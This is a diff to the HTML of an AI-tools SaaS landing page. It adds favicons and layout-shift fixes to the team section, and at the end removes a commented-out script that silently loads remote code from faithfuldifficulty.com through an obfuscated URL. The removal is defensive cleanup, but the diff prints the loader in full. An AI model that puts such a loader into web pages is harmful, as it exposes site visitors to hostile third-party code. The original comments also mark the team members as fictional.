@@ -105,6 +105,10 @@
   <meta name="description" content="Tech_Gen offers powerful AI tools for image generation, document translation, and text summarization. Boost your workflow with our easy-to-use SaaS platform.">
   <meta name="keywords" content="AI tools, image generator, document translator, text summarizer, tools, generate, translate, Image, word, AI, summery, text">
   
+  <!-- FAVICON FIX: Added favicon for branding and user experience -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M24 5C16.8203 5 11 10.8203 11 18C11 25.1797 16.8203 31 24 31' stroke='%23A800FF' stroke-width='3.5' stroke-linecap='round' stroke-linejoin='round' fill='none'/%3E%3Cpath d='M21 9C15.4772 9 11 13.4772 11 19C11 24.5228 15.4772 29 21 29' stroke='%23A800FF' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round' fill='none'/%3E%3Cpath d='M21 9C25.2727 9 29.0001 12.134 29.0001 16C29.0001 16.9265 28.8437 17.8116 28.5582 18.635L21 18.635L21 9Z' fill='%23A800FF'/%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M24 5C16.8203 5 11 10.8203 11 18C11 25.1797 16.8203 31 24 31' stroke='%23A800FF' stroke-width='3.5' stroke-linecap='round' stroke-linejoin='round' fill='none'/%3E%3Cpath d='M21 9C15.4772 9 11 13.4772 11 19C11 24.5228 15.4772 29 21 29' stroke='%23A800FF' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round' fill='none'/%3E%3Cpath d='M21 9C25.2727 9 29.0001 12.134 29.0001 16C29.0001 16.9265 28.8437 17.8116 28.5582 18.635L21 18.635L21 9Z' fill='%23A800FF'/%3E%3C/svg%3E">
+
   <!-- Google / Search Engine Verification -->
   <meta name="google-site-verification" content="X9MYWN4vvkmGDu1DhXPVmi-Sm4a4dsnbKbIrT4WfImQ" />
   
@@ -427,23 +431,23 @@
             <div class="mt-20">
                 <h2 class="text-3xl font-bold text-center mb-12 text-white">Meet the Team</h2>
                 <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-12 max-w-5xl mx-auto">
-                    <!-- Fictional Employee 1 -->
+                    <!-- CLS FIX: Added width and height attributes to prevent layout shift as images load. -->
                     <div class="text-center">
-                        <img class="w-32 h-32 rounded-full mx-auto mb-4 border-4 border-gray-700 shadow-lg" src="https://i.postimg.cc/dQHF8KY2/Photo.jpg/150?u/150?u=manjesh" alt="Photo of Manjesh Sharma" loading="lazy">
+                        <img class="w-32 h-32 rounded-full mx-auto mb-4 border-4 border-gray-700 shadow-lg" src="https://i.postimg.cc/dQHF8KY2/Photo.jpg/150?u/150?u=manjesh" alt="Photo of Manjesh Sharma" width="128" height="128" loading="lazy">
                         <h3 class="text-xl font-semibold text-white">Manjesh Sharma</h3>
                         <p class="text-[#A800FF] font-medium">Founder & CEO</p>
                         <p class="text-gray-400 mt-2 text-sm">With a vision to make AI accessible to all, Manjesh founded Tech_Gen to bridge the gap between complex technology and everyday users. He leads the company's strategy and is passionate about user-centric product development.</p>
                     </div>
-                    <!-- Fictional Employee 2 -->
+                    <!-- CLS FIX: Added width and height attributes to prevent layout shift as images load. -->
                     <div class="text-center">
-                        <img class="w-32 h-32 rounded-full mx-auto mb-4 border-4 border-gray-700 shadow-lg" src="https://i.pravatar.c/150?u=elara" alt="." loading="lazy">
+                        <img class="w-32 h-32 rounded-full mx-auto mb-4 border-4 border-gray-700 shadow-lg" src="https://i.pravatar.c/150?u=elara" alt="Photo of Rahul Sharma" width="128" height="128" loading="lazy">
                         <h3 class="text-xl font-semibold text-white">Rahul Sharma</h3>
                         <p class="text-[#A800FF] font-medium">Lead AI Researcher</p>
                         <p class="text-gray-400 mt-2 text-sm">Rahul Sharma is the brilliant mind behind our AI models. With a Ph.D. in Computational Linguistics, she ensures our translation and summarization tools are not just accurate, but also contextually intelligent and nuanced.</p>
                     </div>
-                    <!-- Fictional Employee 3 -->
+                    <!-- CLS FIX: Added width and height attributes to prevent layout shift as images load. -->
                     <div class="text-center">
-                        <img class="w-32 h-32 rounded-full mx-auto mb-4 border-4 border-gray-700 shadow-lg" src="https://i.pravatar.c/150?u=kai" alt="." loading="lazy">
+                        <img class="w-32 h-32 rounded-full mx-auto mb-4 border-4 border-gray-700 shadow-lg" src="https://i.pravatar.c/150?u=kai" alt="Photo of Jyoth Prakash" width="128" height="128" loading="lazy">
                         <h3 class="text-xl font-semibold text-white">Jyoth Prakash</h3>
                         <p class="text-[#A800FF] font-medium">Head of Design & UX</p>
                         <p class="text-gray-400 mt-2 text-sm">Prakash believes that powerful technology should feel effortless. He is responsible for Tech_Gen's clean, intuitive interface, ensuring that every user, regardless of skill level, has a seamless and enjoyable experience.</p>
@@ -973,6 +977,7 @@
                 <p id="imagePlaceholderText" class="text-gray-400 text-sm">Image will appear here</p>
               </div>
               <div id="imageResultContainer" class="hidden">
+                 <!-- The generated image is contained within a fixed-height div to prevent CLS -->
                 <img id="generatedImage" src="" alt="Generated image" class="rounded mx-auto border border-gray-700 max-w-full h-64 object-contain">
                 <button id="downloadImageBtn" class="mt-2 bg-[#D480FF] text-black text-sm font-medium px-4 py-2 rounded hover-glow">
                   Download Image
@@ -2563,19 +2568,5 @@
         if (textToDownload) { downloadContent(textToDownload, `${originalFilename}_translated.txt`); }
     });
   </script>
-  <!-- REMOVED: The following script was identified as malicious/broken and has been removed to resolve the external script error.
-  <script>
-    (function(lvnc){
-    var d = document,
-        s = d.createElement('script'),
-        l = d.scripts[d.scripts.length - 1];
-    s.settings = lvnc || {};
-    s.src = "\/\/faithfuldifficulty.com\/bpXsV.s\/dRGelV0yY\/WUcv\/SeZmb9JuhZ-UVlRkPP\/T\/Yn0WNQjTUC2nOfT\/kZtQNOjeQj2AN\/TNc\/wsMxAk";
-    s.async = true;
-    s.referrerPolicy = 'no-referrer-when-downgrade';
-    l.parentNode.insertBefore(s, l);
-    })({})
-  </script>
-  -->
 </body>
 </html>
